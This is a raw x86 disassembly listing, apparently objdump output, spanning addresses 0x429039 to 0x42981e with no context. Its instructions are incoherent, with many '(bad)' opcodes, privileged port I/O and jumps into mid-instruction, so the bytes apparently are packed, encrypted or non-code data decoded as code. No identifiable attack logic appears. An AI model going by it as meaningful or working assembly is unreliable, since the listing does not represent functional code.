  429039:	xchg   BYTE PTR [esi+eax*8-0x2c087002],ch
  429040:	pop    DWORD PTR ds:0x31c8
  429046:	(bad)  [edi+0xe48]
  42904c:	mov    esi,0x2aa4979a
  429051:	jae    0x429057
  429053:	ins    DWORD PTR es:[edi],dx
  429054:	add    BYTE PTR [eax],al
  429056:	mov    esi,0x4ddf23d
  42905b:	aad    0x0
  42905d:	add    BYTE PTR [ebp-0x589764ae],bh
  429063:	cmc    
  429064:	and    BYTE PTR [ebx+esi*4],dl
  429067:	pop    ebp
  429068:	imul   ebx,DWORD PTR [ecx+0x1534f181],0xfffffff2
  42906f:	mov    dh,0x53
  429071:	pop    ds
  429072:	jno    0x429060
  429074:	fdivr  DWORD PTR [ebx+0x0]
  429077:	call   0x1b7c907c
  42907c:	scas   al,BYTE PTR es:[edi]
  42907d:	lods   eax,DWORD PTR ds:[esi]
  42907e:	out    dx,eax
  42907f:	fcom   st(2)
  429081:	fidiv  DWORD PTR [eax]
  429083:	ins    BYTE PTR es:[edi],dx
  429084:	retf   
  429085:	bound  eax,QWORD PTR [ecx+0x6523a8b7]
  42908b:	cmp    edx,ecx
  42908d:	inc    ebp
  42908e:	or     dh,BYTE PTR fs:[eax]
  429091:	adc    DWORD PTR [ebx],eax
  429093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429094:	ins    BYTE PTR es:[edi],dx
  429095:	fsub   QWORD PTR [edi+0x26]
  429098:	test   BYTE PTR [esi],ah
  42909a:	add    BYTE PTR [eax],al
  42909c:	stos   DWORD PTR es:[edi],eax
  42909d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42909e:	cmp    BYTE PTR [ebp+ecx*1-0x51ad0000],cl
  4290a5:	lea    ebx,[ebp+0x16]
  4290a8:	mov    cl,0xa2
  4290aa:	pop    eax
  4290ab:	push   es
  4290ac:	push   0xffffffaa
  4290ae:	adc    ah,BYTE PTR [edi-0x22ccb5c8]
  4290b4:	adc    edx,DWORD PTR [ebp+0x34]
  4290b7:	adc    esi,DWORD PTR [edi+eax*8-0x46]
  4290bb:	in     eax,dx
  4290bc:	ret    
  4290bd:	and    bh,BYTE PTR [ecx-0x7b]
  4290c0:	dec    ebx
  4290c1:	std    
  4290c2:	in     eax,0x94
  4290c4:	test   al,0xba
  4290c6:	(bad)  
  4290c7:	aad    0xf8
  4290c9:	icebp  
  4290ca:	sti    
  4290cb:	pusha  
  4290cc:	ins    BYTE PTR es:[edi],dx
  4290cd:	leave  
  4290ce:	xchg   ebp,eax
  4290cf:	pop    ds
  4290d0:	mov    al,0x97
  4290d2:	in     al,0xf4
  4290d4:	sbb    ah,BYTE PTR [edx+edx*1]
  4290d7:	dec    eax
  4290d8:	rol    BYTE PTR [eax],0x0
  4290db:	out    0x44,al
  4290dd:	out    0x0,al
  4290df:	add    BYTE PTR [ebp-0x2f2c12d1],dh
  4290e5:	xchg   esi,eax
  4290e6:	jl     0x42911e
  4290e8:	mov    dh,0x5e
  4290ea:	ror    bl,cl
  4290ec:	xlat   BYTE PTR ds:[ebx]
  4290ed:	retf   0xfc1f
  4290f0:	lds    edi,FWORD PTR [ebx-0xf]
  4290f3:	jecxz  0x42910d
  4290f5:	pop    ecx
  4290f6:	xlat   BYTE PTR ds:[ebx]
  4290f7:	fcomp  DWORD PTR [ebp+0x6]
  4290fa:	sbb    bl,BYTE PTR [ecx-0x1130559d]
  429100:	mov    esp,0xc648
  429105:	ja     0x42914c
  429107:	and    ecx,DWORD PTR [ebp+ecx*8+0x0]
  42910b:	add    cl,cl
  42910d:	shl    DWORD PTR [ebp+0x1342dd5],cl
  429113:	frstor [edi+0x29]
  429116:	dec    edx
  429117:	fst    QWORD PTR [esi-0xf286ebb]
  42911d:	ja     0x4290a9
  42911f:	loopne 0x4290a4
  429121:	xchg   esp,eax
  429122:	mov    eax,ds:0xc8c
  429127:	popf   
  429128:	adc    BYTE PTR [ecx],bl
  42912a:	stc    
  42912b:	rcr    BYTE PTR [eax+eax*1+0x0],0xa0
  429130:	and    DWORD PTR [esi-0x534dcdbb],0xd7c8
  42913a:	push   cs
  42913b:	into   
  42913c:	mov    dl,0x8
  42913e:	inc    ecx
  42913f:	add    BYTE PTR [eax],al
  429141:	push   0xffffffb8
  429143:	adc    ebx,DWORD PTR [ebx]
  429145:	or     cl,BYTE PTR [ebx-0x13e2b9f0]
  42914b:	fist   DWORD PTR [eax+ebp*1+0xe7aed62]
  429152:	frstor [ecx+0x63]
  429155:	or     BYTE PTR [eax+eax*1+0x2f4d0200],dl
  42915c:	in     eax,dx
  42915d:	mov    ebx,0xcff3cffb
  429162:	add    cl,BYTE PTR [ecx-0x1b1c4388]
  429168:	fwait
  429169:	adc    DWORD PTR [edx-0x29],eax
  42916c:	out    0x5c,eax
  42916e:	or     eax,0x269a8196
  429173:	mov    ah,0x11
  429175:	and    dh,al
  429177:	sub    al,0x42
  429179:	inc    edi
  42917a:	leave  
  42917b:	push   ecx
  42917c:	add    DWORD PTR [edi-0x6490e8d],ebp
  429182:	frstor [esi+eax*8-0x343e11e]
  429189:	cld    
  42918a:	(bad)  
  42918c:	cmp    eax,0x52411fd5
  429191:	jmp    DWORD PTR [esi+0x64af9b31]
  429197:	arpl   bx,di
  429199:	push   ebp
  42919a:	aam    0xb2
  42919c:	inc    esp
  42919d:	inc    BYTE PTR [eax]
  42919f:	add    BYTE PTR [ecx+0x4b],dl
  4291a2:	inc    ebx
  4291a3:	aas    
  4291a4:	repz and ecx,DWORD PTR [ebp+ebp*2-0x36ee0000]
  4291ac:	shl    DWORD PTR [ecx-0x41f80ea7],1
  4291b2:	mov    edx,0x4a75019
  4291b7:	rol    BYTE PTR [eax],0x0
  4291ba:	data16 into 
  4291bc:	rol    ebx,cl
  4291be:	cwde   
  4291bf:	push   ss
  4291c0:	jae    0x429186
  4291c2:	rol    DWORD PTR [eax],1
  4291c4:	add    BYTE PTR [edi+0x4a],bh
  4291c7:	sub    edi,DWORD PTR [esi+0x783d5f0b]
  4291cd:	(bad)  
  4291ce:	push   cs
  4291cf:	iret   
  4291d0:	sub    dl,dl
  4291d2:	lods   al,BYTE PTR ds:[esi]
  4291d3:	inc    eax
  4291d4:	rol    BYTE PTR [eax],1
  4291d6:	add    BYTE PTR [esp+ebx*2],dh
  4291d9:	jp     0x429184
  4291db:	cs mov al,0x14
  4291de:	test   al,0xd6
  4291e0:	jge    0x429210
  4291e2:	mov    bh,BYTE PTR [edx-0x49]
  4291e5:	retf   
  4291e6:	sbb    cl,BYTE PTR [edi-0x56]
  4291e9:	dec    eax
  4291ea:	aas    
  4291eb:	add    BYTE PTR [eax],al
  4291ed:	mov    al,0x63
  4291ef:	fist   DWORD PTR [ecx+0x3c3283eb]
  4291f5:	sbb    al,0x4f
  4291f7:	dec    ecx
  4291f8:	lods   al,BYTE PTR ds:[esi]
  4291f9:	and    esp,eax
  4291fb:	push   ecx
  4291fc:	ret    0xa2d9
  4291ff:	jge    0x4291ce
  429201:	(bad)  
  429202:	clc    
  429203:	push   edi
  429204:	icebp  
  429205:	or     eax,0xf667654b
  42920a:	mov    dl,BYTE PTR [edi-0x20259e7a]
  429210:	xor    al,0xe1
  429212:	fwait
  429213:	dec    ebx
  429214:	or     eax,0xebb4f6fe
  429219:	jmp    0x429278
  42921b:	dec    ebx
  42921c:	test   eax,0x84cfe513
  429221:	dec    esi
  429222:	add    BYTE PTR [eax],al
  429224:	mov    edx,0x91b87c5
  429229:	inc    edi
  42922a:	push   0xa59aabc9
  42922f:	adc    al,0x93
  429231:	sub    eax,0xd5a0dbf0
  429236:	into   
  429237:	sub    al,BYTE PTR [eax+edi*8+0x4f690000]
  42923e:	push   ecx
  42923f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429240:	pop    ds
  429241:	call   0x30878cba
  429246:	add    BYTE PTR [eax],al
  429248:	jnp    0x429201
  42924a:	shr    DWORD PTR [edx+0x20],0x64
  42924e:	fimul  WORD PTR [ecx-0x7c]
  429251:	add    BYTE PTR fs:[eax],al
  429254:	popf   
  429255:	mov    edi,DWORD PTR [edx]
  429257:	imul   edi,DWORD PTR [eax],0xd855aeda
  42925d:	ins    BYTE PTR es:[edi],dx
  42925e:	mov    esi,es
  429260:	add    BYTE PTR [eax],al
  429262:	and    DWORD PTR [edi-0xf396966],edi
  429268:	rcl    BYTE PTR [ecx-0x4d812bc7],1
  42926e:	repnz push ebx
  429270:	and    eax,0xe215bd7b
  429275:	push   cs
  429276:	gs push edi
  429278:	mov    esp,0xac74c705
  42927d:	idiv   al
  42927f:	rol    DWORD PTR [ecx+0x4446debe],1
  429285:	push   ecx
  429286:	add    BYTE PTR [eax],al
  429288:	inc    ebp
  429289:	loope  0x4292c9
  42928b:	ret    
  42928c:	fwait
  42928d:	xor    eax,0x57b0900d
  429292:	jo     0x429260
  429294:	and    al,0x0
  429296:	add    BYTE PTR [eax+ebp*1-0x2be5f114],bl
  42929d:	in     al,0x78
  42929f:	adc    BYTE PTR [ecx+ecx*4],ch
  4292a2:	inc    ebx
  4292a3:	inc    eax
  4292a4:	dec    edi
  4292a5:	add    BYTE PTR [eax],al
  4292a7:	outs   dx,DWORD PTR ds:[esi]
  4292a8:	jae    0x4292cc
  4292aa:	loop   0x429307
  4292ac:	lock aam 0x29
  4292af:	jmp    0x4292a9
  4292b1:	lods   al,BYTE PTR ds:[esi]
  4292b2:	repz loope 0x4292ff
  4292b5:	xchg   ebx,eax
  4292b6:	cmp    eax,0xe53e56e5
  4292bb:	and    ch,BYTE PTR [edx+edi*8+0x68]
  4292bf:	retf   
  4292c0:	xor    esi,DWORD PTR [ecx+0x46]
  4292c3:	ror    DWORD PTR [ecx+0x40],1
  4292c6:	dec    ebx
  4292c7:	add    BYTE PTR [eax],al
  4292c9:	(bad)  
  4292ca:	ins    BYTE PTR es:[edi],dx
  4292cb:	fs in  al,dx
  4292cd:	aam    0x22
  4292cf:	or     ecx,DWORD PTR [esi-0x71c59a0]
  4292d5:	mov    ebp,0xd900c6
  4292da:	add    BYTE PTR [eiz*8+0x30e40000],cl
  4292e1:	xor    edx,edx
  4292e3:	cmp    al,0xc
  4292e5:	or     eax,0xb0fd0000
  4292ea:	add    dl,BYTE PTR [ecx]
  4292ec:	dec    ecx
  4292ed:	or     DWORD PTR [edx+0x53],edx
  4292f0:	mov    esp,0xefc049
  4292f5:	add    BYTE PTR [esi+0x1b002b],al
  4292fb:	add    BYTE PTR [esi+0x7c],cl
  4292fe:	movzx  esp,BYTE PTR [ebp+0x1d1810cb]
  429305:	jp     0x42935a
  429307:	dec    esp
  429308:	stos   DWORD PTR es:[edi],eax
  429309:	add    BYTE PTR [eax],al
  42930b:	test   BYTE PTR [ebp-0x58680000],bh
  429311:	xchg   esi,eax
  429312:	adc    al,0xbd
  429314:	adc    ebx,edi
  429316:	test   DWORD PTR [eax+0x526b8af4],ebp
  42931c:	daa    
  42931d:	out    dx,eax
  42931e:	and    eax,0xd430c503
  429323:	mul    al
  429325:	xchg   edx,eax
  429326:	add    BYTE PTR [eax+eax*1-0x1db04900],ah
  42932d:	xchg   BYTE PTR ds:0x4bc8,dh
  429333:	inc    edx
  429334:	sub    esi,DWORD PTR [ecx]
  429336:	pop    ebx
  429337:	in     eax,dx
  429338:	into   
  429339:	pushf  
  42933a:	mov    dl,0xe6
  42933c:	push   eax
  42933d:	and    bl,BYTE PTR [ecx]
  42933f:	sub    al,0x39
  429341:	xchg   ecx,edi
  429343:	dec    edx
  429344:	inc    esi
  429345:	add    al,0xba
  429347:	add    BYTE PTR [eax],al
  429349:	outs   dx,DWORD PTR ds:[esi]
  42934a:	icebp  
  42934b:	pusha  
  42934c:	jb     0x42931e
  42934e:	pop    esp
  42934f:	arpl   cx,dx
  429351:	pop    ecx
  429352:	mov    al,ds:0x8cbfde70
  429357:	dec    edi
  429358:	add    BYTE PTR [eax],al
  42935a:	std    
  42935b:	test   eax,0x688e38ae
  429360:	mov    ds:0xfc785a20,al
  429365:	in     eax,dx
  429366:	dec    edx
  429367:	add    eax,0x63889c62
  42936c:	add    BYTE PTR [eax],al
  42936e:	sbb    DWORD PTR [edx-0x5bf77493],edi
  429374:	add    BYTE PTR [eax],al
  429376:	gs dec ecx
  429378:	ja     0x42938b
  42937a:	inc    esi
  42937b:	data16 sub BYTE PTR [eax+eax*1-0x76560700],0x46
  429384:	sbb    BYTE PTR [ecx+ecx*4],bl
  429387:	inc    esi
  429388:	xor    eax,0x8088ac23
  42938d:	add    BYTE PTR [eax],al
  42938f:	pop    es
  429390:	inc    esi
  429391:	sbb    BYTE PTR [esi-0x71ba40a8],cl
  429397:	inc    ecx
  429398:	aaa    
  429399:	js     0x429326
  42939b:	pop    esp
  42939c:	stos   DWORD PTR es:[edi],eax
  42939d:	out    dx,al
  42939e:	xchg   DWORD PTR [ebx-0x647f8b43],ebx
  4293a4:	add    BYTE PTR [eax],al
  4293a6:	in     al,0xa9
  4293a8:	pop    edx
  4293a9:	jp     0x4293ea
  4293ab:	xor    edi,0x98e76f03
  4293b1:	jp     0x42940c
  4293b3:	push   esi
  4293b4:	and    eax,0x40595678
  4293b9:	add    al,BYTE PTR [eax]
  4293bb:	add    BYTE PTR [ecx+0x1e],dh
  4293be:	ret    0x70ad
  4293c1:	je     0x429391
  4293c3:	xchg   ebx,eax
  4293c4:	jno    0x429371
  4293c6:	cmp    BYTE PTR [ecx+0x6d],0x86
  4293ca:	fst    QWORD PTR [eax+0x7b]
  4293cd:	jmp    0x429420
  4293cf:	aas    
  4293d0:	ins    DWORD PTR es:[edi],dx
  4293d1:	pop    ss
  4293d2:	push   ds
  4293d3:	cs jns 0x42940e
  4293d6:	xchg   esi,eax
  4293d7:	mov    ds,WORD PTR cs:[ecx+0x59]
  4293db:	or     DWORD PTR [ebx+eiz*8-0x67],esi
  4293df:	(bad)  
  4293e0:	enter  0x0,0x0
  4293e4:	push   0x1440a6
  4293e9:	add    BYTE PTR [ebx-0x1b],dh
  4293ec:	mov    esp,0x5ec78e3a
  4293f1:	dec    eax
  4293f2:	fadd   QWORD PTR [eax]
  4293f4:	add    BYTE PTR [ebp+0x16],ch
  4293f7:	adc    eax,0x95de7457
  4293fc:	fcos   
  4293fe:	sub    eax,0xc28047a7
  429403:	add    BYTE PTR [eax],al
  429405:	add    al,0xe3
  429407:	add    BYTE PTR [eax],al
  429409:	mov    edi,0x5688cf
  42940e:	add    BYTE PTR [esi],ah
  429410:	ret    0xbcfa
  429413:	cs stos DWORD PTR es:[edi],eax
  429415:	jmp    0x429459
  429417:	imul   DWORD PTR [ecx-0x40e571cd]
  42941d:	push   edx
  42941e:	mov    DWORD PTR [edi],ecx
  429420:	mov    edi,0xc48047
  429425:	add    dh,bl
  429427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429428:	lods   al,BYTE PTR ds:[esi]
  429429:	jl     0x42941d
  42942b:	mov    al,ds:0xd98075
  429430:	add    cl,bl
  429432:	test   eax,0x3d4c79f3
  429437:	add    BYTE PTR [eax],al
  429439:	(bad)  
  42943a:	int    0x0
  42943c:	add    BYTE PTR [ebx],dh
  42943e:	ret    0x9a97
  429441:	sbb    DWORD PTR [edi],0xffffff94
  429444:	fiadd  DWORD PTR [ecx+ebp*1+0x0]
  429448:	add    BYTE PTR [eax-0x1bffffcd],al
  42944e:	test   eax,0x98f9461f
  429453:	dec    eax
  429454:	inc    DWORD PTR [eax]
  429456:	add    dh,bh
  429458:	js     0x4293f9
  42945a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42945b:	jge    0x429475
  42945d:	pushf  
  42945e:	cmc    
  42945f:	je     0x429472
  429461:	mov    edi,0xd7147270
  429466:	cmp    dh,BYTE PTR [ebp-0x6c]
  429469:	lahf   
  42946a:	nop
  42946b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42946c:	outs   dx,BYTE PTR ds:[esi]
  42946d:	xor    BYTE PTR [eax+0x6e],0x1c
  429471:	fld    TBYTE PTR [ecx]
  429473:	outs   dx,BYTE PTR ds:[esi]
  429474:	cmp    ebx,DWORD PTR [esi]
  429476:	out    dx,eax
  429477:	jne    0x4294a6
  429479:	push   edi
  42947a:	pushf  
  42947b:	jns    0x4294b5
  42947d:	add    bl,0x75
  429480:	jns    0x429459
  429482:	xchg   ecx,eax
  429483:	jno    0x429409
  429485:	aas    
  429486:	add    BYTE PTR [eax],al
  429488:	lahf   
  429489:	dec    ebp
  42948a:	add    ch,BYTE PTR [eax-0x5d87ea8a]
  429490:	add    BYTE PTR [edi-0x7fa10000],0x4d
  429497:	add    BYTE PTR [eax],al
  429499:	cli    
  42949a:	test   eax,0x972ffbae
  42949f:	arpl   WORD PTR [ecx-0x79],si
  4294a2:	ror    BYTE PTR [ebx+ebp*4+0x1a750000],1
  4294a9:	addr16 ret 
  4294ab:	jne    0x42951e
  4294ad:	xlat   BYTE PTR ds:[ebx]
  4294ae:	scas   al,BYTE PTR es:[edi]
  4294af:	jns    0x429469
  4294b1:	loope  0x42951f
  4294b3:	sub    bl,0x0
  4294b6:	add    BYTE PTR [edx-0x547fda59],bl
  4294bc:	add    BYTE PTR [eax],al
  4294be:	lds    ebp,FWORD PTR [ecx+0x15806e]
  4294c4:	add    BYTE PTR [ecx+ebp*4+0x23803b],ch
  4294cb:	add    bh,al
  4294cd:	test   eax,0x1807d
  4294d2:	add    BYTE PTR [ebx+ebp*4],dl
  4294d5:	cmp    eax,DWORD PTR [eax-0x7bffff60]
  4294db:	add    DWORD PTR [eax],eax
  4294dd:	add    BYTE PTR ds:0xb68077,dl
  4294e3:	add    BYTE PTR [edx-0x2e8f1757],ch
  4294e9:	fimul  DWORD PTR [esi+0x40a9ed27]
  4294ef:	add    BYTE PTR gs:[eax],al
  4294f2:	jno    0x4294c7
  4294f4:	fisubr DWORD PTR [edx]
  4294f6:	jb     0x4294af
  4294f8:	test   eax,0xdadd6ceb
  4294fd:	mov    ebp,0x3dc4a6a
  429502:	jno    0x429552
  429504:	(bad)  
  429506:	jne    0x4294c8
  429508:	fld    DWORD PTR [eax]
  42950a:	add    BYTE PTR [ecx-0x251f8677],ch
  429510:	bound  esi,QWORD PTR [edx-0x4a]
  429513:	xchg   edi,eax
  429514:	push   ebp
  429515:	outs   dx,BYTE PTR ds:[esi]
  429516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429517:	fistp  QWORD PTR [eax+0x6e]
  42951a:	xor    BYTE PTR [edi+0x5b687a89],dl
  429520:	jbe    0x429594
  429522:	shr    BYTE PTR [esi+0x0],0x0
  429526:	cs pop ecx
  429528:	jno    0x429598
  42952a:	fbstp  TBYTE PTR [ebx+0x6e]
  42952d:	xchg   edi,ebx
  42952f:	outs   dx,DWORD PTR ds:[esi]
  429530:	outs   dx,BYTE PTR ds:[esi]
  429531:	retf   
  429532:	fidiv  DWORD PTR [eax+0x79]
  429535:	sub    al,0x93
  429537:	add    ch,BYTE PTR [ecx-0x13]
  42953a:	xchg   esi,eax
  42953b:	jne    0x4295ab
  42953d:	sbb    bh,0xa4
  429540:	jl     0x4294e5
  429542:	test   eax,0x678021
  429547:	add    ch,ah
  429549:	test   eax,0xd6a27512
  42954e:	inc    ebp
  42954f:	and    BYTE PTR [ebp-0x5f800000],0x0
  429556:	add    bh,bl
  429558:	or     eax,0x3a80
  42955d:	cmc    
  42955e:	fidivr DWORD PTR [ecx]
  429560:	add    BYTE PTR [eax-0x39a20000],0x6d
  429567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429568:	push   ecx
  429569:	mov    BYTE PTR [ebx-0x80],0x37
  42956d:	add    BYTE PTR [eax],al
  42956f:	xchg   ebp,eax
  429570:	mov    bl,BYTE PTR [ecx]
  429572:	cmp    BYTE PTR [esi-0x566c0000],0x8d
  429579:	jae    0x4295d1
  42957b:	sbb    eax,0xa9a17b85
  429580:	cs jb  0x42950b
  429583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429584:	add    BYTE PTR [eax],al
  429586:	test   eax,0xa9a37fdb
  42958b:	jge    0x429608
  42958d:	lock test eax,0x5780
  429593:	imul   eax,DWORD PTR [eax+0x180000f6],0x77
  42959a:	sub    BYTE PTR [ebx+0x0],0x0
  42959e:	xchg   BYTE PTR [ecx+0x1c8d72a8],ch
  4295a4:	sub    DWORD PTR [edx-0x57],0x8f6f99ec
  4295ab:	pop    ds
  4295ac:	sub    dh,BYTE PTR [edx-0x6d]
  4295af:	test   eax,0x18f97b4b
  4295b4:	popf   
  4295b5:	push   0x46
  4295b7:	sbb    al,0xe3
  4295b9:	outs   dx,BYTE PTR ds:[esi]
  4295ba:	sub    dl,al
  4295bc:	jne    0x42962c
  4295be:	cld    
  4295bf:	fld    TBYTE PTR [esi]
  4295c1:	outs   dx,BYTE PTR ds:[esi]
  4295c2:	fcomp  QWORD PTR [ebx]
  4295c4:	mov    edx,0x552f7269
  4295c9:	jno    0x42954c
  4295cb:	sbb    bh,BYTE PTR [ecx+0x6e]
  4295ce:	lods   al,BYTE PTR ds:[esi]
  4295cf:	test   eax,0x62447090
  4295d4:	add    BYTE PTR [eax],al
  4295d6:	fidiv  DWORD PTR [esi-0xd504393]
  4295dc:	jb     0x429628
  4295de:	aad    0x72
  4295e0:	outs   dx,BYTE PTR ds:[esi]
  4295e1:	arpl   ax,bx
  4295e3:	movq   mm4,QWORD PTR [edi-0x1782aeac]
  4295ea:	test   al,0xc3
  4295ec:	imul   ebp,DWORD PTR [ecx+0x5e803754],0x0
  4295f3:	add    BYTE PTR [esi+0xdf84a9],bh
  4295f9:	add    BYTE PTR [ebx-0x41],bh
  4295fc:	test   eax,0x778041
  429601:	add    cl,al
  429603:	test   eax,0xa99e7ceb
  429608:	inc    edi
  429609:	add    BYTE PTR [ebx],0x0
  42960c:	add    BYTE PTR [ecx+ebp*4+0x71802f],bh
  429613:	add    cl,dl
  429615:	test   eax,0x78058
  42961a:	add    BYTE PTR [edx],bh
  42961c:	sbb    eax,0xc628734d
  429621:	inc    ebx
  429622:	cmp    BYTE PTR [ecx-0x343f0000],0x71
  429629:	jae    0x429606
  42962b:	ror    BYTE PTR [ebp+0x79],cl
  42962e:	mov    esp,0xb77b6ee8
  429633:	sbb    esp,DWORD PTR [esi+0x72]
  429636:	mov    edx,0x5470de54
  42963b:	(bad)  
  42963c:	jge    0x4296ad
  42963e:	stc    
  42963f:	shr    BYTE PTR [ebx+0x79],1
  429642:	outs   dx,DWORD PTR ds:[esi]
  429643:	pop    eax
  429644:	test   BYTE PTR [edi-0x5e890000],al
  42964a:	test   eax,0x14967286
  42964f:	mov    esi,0x5d17b6f
  429654:	imul   ecx,DWORD PTR [edi+0xf732518],0xffffffd4
  42965b:	es jae 0x42968e
  42965e:	aam    0x25
  429660:	jnp    0x4296e0
  429662:	sbb    BYTE PTR [ebp+0x70],dh
  429665:	sbb    BYTE PTR [esi+0x33],0x74
  429669:	or     edx,esp
  42966b:	icebp  
  42966c:	jnp    0x429658
  42966e:	sar    BYTE PTR [edx+ebp*2+0x5f],1
  429672:	sbb    al,0x7e
  429674:	jae    0x42967e
  429676:	pop    ebx
  429677:	add    BYTE PTR [eax],al
  429679:	xlat   BYTE PTR ds:[ebx]
  42967a:	jne    0x4296eb
  42967c:	add    edx,esp
  42967e:	scas   al,BYTE PTR es:[edi]
  42967f:	jb     0x4296ef
  429681:	shr    bl,cl
  429683:	jle    0x429624
  429685:	scas   al,BYTE PTR es:[edi]
  429686:	scas   al,BYTE PTR es:[edi]
  429687:	ins    BYTE PTR es:[edi],dx
  429688:	pop    esi
  429689:	popf   
  42968a:	xchg   ebp,eax
  42968b:	ins    DWORD PTR es:[edi],dx
  42968c:	mov    al,0x54
  42968e:	jae    0x429702
  429690:	imul   ebx,DWORD PTR [esi+edx*2+0x72],0x3a
  429695:	fisub  WORD PTR [edx+0x64d4656a]
  42969b:	jb     0x4296ff
  42969d:	aam    0x5b
  42969f:	jb     0x4296cb
  4296a1:	ret    0x6d7e
  4296a4:	and    al,0x0
  4296a7:	add    al,dl
  4296a9:	inc    ecx
  4296aa:	jns    0x429723
  4296ac:	pop    edi
  4296ad:	imul   esi,DWORD PTR [edx+0x7b],0x716a60d4
  4296b4:	pushf  
  4296b5:	mov    al,ds:0xf25b6d6b
  4296ba:	ins    BYTE PTR es:[edi],dx
  4296bb:	arpl   di,dx
  4296bd:	data16 jb 0x429700
  4296c0:	mov    eax,0xc3d40000
  4296c5:	jbe    0x4296b3
  4296c7:	aad    0xf
  4296c9:	jne    0x42966a
  4296cb:	shr    DWORD PTR [ecx+0x75],cl
  4296ce:	dec    ecx
  4296cf:	call   0x7710:0xd463707d
  4296d6:	fstp   DWORD PTR [eax]
  4296d8:	sub    al,0x73
  4296da:	sahf   
  4296db:	rcl    DWORD PTR [esi-0x112a638d],1
  4296e1:	jb     0x429710
  4296e3:	fidiv  DWORD PTR [edx+esi*2+0x777eda0e]
  4296ea:	xor    dl,cl
  4296ec:	(bad)  
  4296ed:	jo     0x429738
  4296ef:	pop    ebx
  4296f0:	js     0x429762
  4296f2:	sub    bl,dl
  4296f4:	aad    0x72
  4296f6:	or     BYTE PTR [eax+eax*1],bh
  4296f9:	add    ch,dl
  4296fb:	or     eax,0x40d27d78
  429700:	test   al,0x0
  429702:	add    BYTE PTR [ebp-0x66],dh
  429705:	aad    0x5
  429707:	jae    0x4296ba
  429709:	aam    0x89
  42970b:	outs   dx,DWORD PTR ds:[esi]
  42970c:	pop    edx
  42970d:	fwait
  42970e:	(bad)  
  429710:	pop    es
  429711:	fwait
  429712:	cdq    
  429713:	ins    DWORD PTR es:[edi],dx
  429714:	scas   eax,DWORD PTR es:[edi]
  429715:	aad    0xc2
  429717:	jae    0x42974d
  429719:	aam    0x6d
  42971b:	ins    BYTE PTR es:[edi],dx
  42971c:	xor    bl,bh
  42971e:	and    dh,BYTE PTR [edx+0x6b]
  429721:	getsec 
  429723:	jp     0x429791
  429725:	test   eax,0xac8003
  42972a:	add    BYTE PTR [edx+0x7072dea9],cl
  429730:	ror    BYTE PTR [edx],cl
  429732:	jp     0x4296f4
  429734:	cwde   
  429735:	add    BYTE PTR [eax],al
  429737:	aam    0x5e
  429739:	jo     0x429718
  42973b:	rol    DWORD PTR [ebx],1
  42973d:	sbb    bl,0x0
  429740:	add    BYTE PTR [ecx-0x5e8b0157],cl
  429746:	aad    0xa
  429748:	jne    0x4296f7
  42974a:	rcr    BYTE PTR [esi+0x3d52e70],1
  429750:	xor    BYTE PTR [edx-0x567a0000],0xcc
  429757:	inc    eax
  429758:	add    BYTE PTR [eax],al
  42975a:	jae    0x4297d0
  42975c:	fldl2e 
  42975e:	jae    0x42976f
  429760:	fwait
  429761:	sahf   
  429762:	jo     0x429723
  429764:	aad    0x2
  429766:	add    BYTE PTR [esi+0x0],0x0
  42976a:	fcmovnbe st,st(5)
  42976c:	mov    esi,0xe24473
  429771:	add    ch,dl
  429773:	retf   
  429774:	jae    0x42978a
  429776:	pop    edx
  429777:	mov    esi,0xc2d5be73
  42977c:	jae    0x42975b
  42977e:	aad    0x5e
  429780:	jo     0x429777
  429782:	aad    0xca
  429784:	jb     0x429778
  429786:	aad    0x42
  429788:	jae    0x429726
  42978a:	aad    0xbd
  42978c:	jae    0x42973b
  42978e:	idiv   DWORD PTR [esi]
  429790:	jae    0x4297ee
  429792:	aad    0xee
  429794:	jae    0x429783
  429796:	aam    0x7d
  429798:	jae    0x4297e0
  42979a:	lock jne 0x42980d
  42979d:	mov    BYTE PTR [ebx-0x78028ca9],0xea
  4297a4:	jb     0x4297c3
  4297a6:	aad    0x22
  4297a8:	jae    0x42973e
  4297aa:	aam    0xbd
  4297ac:	jae    0x429733
  4297ae:	neg    DWORD PTR [ecx]
  4297b0:	jae    0x42979c
  4297b2:	cmp    bl,0x72
  4297b5:	cmp    DWORD PTR [edi-0x19ff8dd3],eax
  4297bb:	add    BYTE PTR [eax],al
  4297bd:	aam    0x5d
  4297bf:	jb     0x4297ef
  4297c1:	aam    0x4a
  4297c3:	jb     0x42980a
  4297c5:	aam    0x2c
  4297c7:	jb     0x4297bb
  4297c9:	xlat   BYTE PTR ds:[ebx]
  4297ca:	pop    esi
  4297cb:	jno    0x4297e3
  4297cd:	aam    0x54
  4297cf:	jb     0x429816
  4297d1:	aam    0xb
  4297d3:	jne    0x4297f8
  4297d5:	aam    0x4f
  4297d7:	jb     0x4297b3
  4297d9:	(bad)  
  4297da:	dec    ebp
  4297db:	jne    0x4297ff
  4297dd:	xlat   BYTE PTR ds:[ebx]
  4297de:	inc    esp
  4297df:	inc    BYTE PTR [eax]
  4297e1:	add    BYTE PTR [edx-0x65],dh
  4297e4:	(bad)  
  4297e5:	in     al,dx
  4297e6:	je     0x429863
  4297e8:	(bad)  
  4297e9:	jmp    0xae71:0xc2d6b371
  4297f0:	xlat   BYTE PTR ds:[ebx]
  4297f1:	xor    dh,BYTE PTR [edx-0x64]
  4297f4:	(bad)  
  4297f5:	popf   
  4297f6:	jne    0x4297c4
  4297f8:	out    0x0,eax
  4297fa:	add    dl,bl
  4297fc:	jp     0x42986e
  4297fe:	push   es
  4297ff:	(bad)  
  429800:	popf   
  429801:	jo     0x4297f5
  429803:	fidiv  DWORD PTR [edx+0x70]
  429806:	cwde   
  429807:	(bad)  
  429808:	popf   
  429809:	jo     0x4297d7
  42980b:	xor    eax,DWORD PTR [eax]
  42980d:	add    dl,bl
  42980f:	jp     0x429881
  429811:	and    dl,dh
  429813:	jge    0x429885
  429815:	in     al,dx
  429816:	fidiv  DWORD PTR [edx+0x70]
  429819:	xchg   esp,eax
  42981a:	(bad)  
  42981b:	jge    0x429890
  42981d:	push   cs
  42981e:	fstp   TBYTE PTR [edx+0x72]
